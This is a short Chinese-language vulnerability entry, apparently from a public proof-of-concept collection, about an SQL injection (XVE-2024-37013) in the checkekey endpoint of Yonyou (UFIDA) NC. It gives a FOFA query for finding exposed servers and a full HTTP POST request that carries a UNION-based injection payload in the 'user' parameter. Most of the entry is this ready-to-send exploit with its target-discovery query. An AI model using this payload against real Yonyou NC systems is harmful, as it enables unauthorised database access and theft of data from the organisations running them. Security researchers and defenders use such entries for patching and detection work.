# 用友NC接口checkekey存在SQL注入漏洞(XVE-2024-37013)

用友NC中checkekey存在SQL注入漏洞，攻击者可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa

```javascript
app="用友-UFIDA-NC"
```

## poc

```javascript
POST /portal/pt/office/checkekey?pageId=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: close

user=1' UNION ALL SELECT NULL,CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(80)||CHR(103)||CHR(106)||CHR(122)||CHR(81)||CHR(70)||CHR(74)||CHR(104)||CHR(106)||CHR(107)||CHR(100)||CHR(74)||CHR(105)||CHR(114)||CHR(88)||CHR(73)||CHR(112)||CHR(81)||CHR(101)||CHR(119)||CHR(116)||CHR(79)||CHR(71)||CHR(78)||CHR(115)||CHR(65)||CHR(111)||CHR(70)||CHR(103)||CHR(85)||CHR(71)||CHR(83)||CHR(101)||CHR(65)||CHR(71)||CHR(90)||CHR(114)||CHR(87)||CHR(78)||CHR(107)||CHR(113)||CHR(106)||CHR(98)||CHR(112)||CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- twnX&ekey=1
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501122254942.webp)

## 漏洞来源

- https://mp.weixin.qq.com/s?__biz=MzkyNDY3MTY3MA==&mid=2247486717&idx=1&sn=09d465455794e1d55e13f2b10565a7ab